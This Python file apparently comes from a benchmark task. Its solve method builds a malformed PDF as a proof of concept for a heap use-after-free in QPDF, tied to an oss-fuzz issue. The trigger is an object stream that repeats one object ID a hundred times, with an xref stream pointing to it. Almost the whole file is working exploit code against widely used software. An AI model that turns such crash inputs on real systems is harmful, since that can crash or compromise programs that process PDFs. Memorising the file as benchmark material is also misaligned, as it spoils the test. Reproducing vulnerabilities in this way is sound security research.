import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in QPDF.
        Targeting oss-fuzz:42535152 in QPDFWriter::preserveObjectStreams.
        The PoC creates an Object Stream containing multiple definitions for the same object ID,
        confusing the object cache during processing.
        """
        
        def pack_row(t, f1, f2):
            # Pack XRef entry: Type (1 byte), Field1 (4 bytes), Field2 (1 byte)
            return struct.pack('>BIB', t, f1, f2)

        content = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"
        offsets = {}
        
        # Object 1: Catalog
        offsets[1] = len(content)
        content += b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        
        # Object 2: Pages
        offsets[2] = len(content)
        content += b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        
        # Object 3: Page
        offsets[3] = len(content)
        content += b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n"
        
        # Object 4: Object Stream (The malicious component)
        # We define object ID 5 multiple times within this stream's mapping.
        # This stresses the logic in QPDF::getCompressibleObjSet which iterates over the stream contents.
        offsets[4] = len(content)
        num_dups = 100
        obj_inner = b"[(Payload)]"
        len_inner = len(obj_inner)
        
        # Construct mapping: "5 0 5 11 5 22 ..."
        # ID 5 repeats 100 times.
        mapping_parts = []
        stream_payload = b""
        for i in range(num_dups):
            mapping_parts.append(f"5 {i * len_inner}")
            stream_payload += obj_inner
            
        mapping_str = " ".join(mapping_parts) + " "
        mapping_bytes = mapping_str.encode('ascii')
        full_stream = mapping_bytes + stream_payload
        
        # /N = number of objects in stream
        content += f"4 0 obj\n<< /Type /ObjStm /N {num_dups} /First {len(mapping_bytes)} /Length {len(full_stream)} >>\nstream\n".encode('ascii')
        content += full_stream
        content += b"\nendstream\nendobj\n"
        
        # Object 6: XRef Stream (To properly reference the ObjStm)
        offsets[6] = len(content)
        
        # Build XRef entries (indices 0 to 6)
        xref_data = b""
        # 0: Free
        xref_data += pack_row(0, 0, 0)
        # 1: Catalog
        xref_data += pack_row(1, offsets[1], 0)
        # 2: Pages
        xref_data += pack_row(1, offsets[2], 0)
        # 3: Page
        xref_data += pack_row(1, offsets[3], 0)
        # 4: ObjStm
        xref_data += pack_row(1, offsets[4], 0)
        # 5: Compressed object (located in Stream 4, index 0)
        xref_data += pack_row(2, 4, 0)
        # 6: XRef Stream (Self)
        xref_data += pack_row(1, offsets[6], 0)
        
        content += f"6 0 obj\n<< /Type /XRef /Size 7 /W [1 4 1] /Root 1 0 R /Length {len(xref_data)} >>\nstream\n".encode('ascii')
        content += xref_data
        content += b"\nendstream\nendobj\n"
        
        # Trailer
        content += b"startxref\n"
        content += f"{offsets[6]}\n".encode('ascii')
        content += b"%%EOF\n"
        
        return content
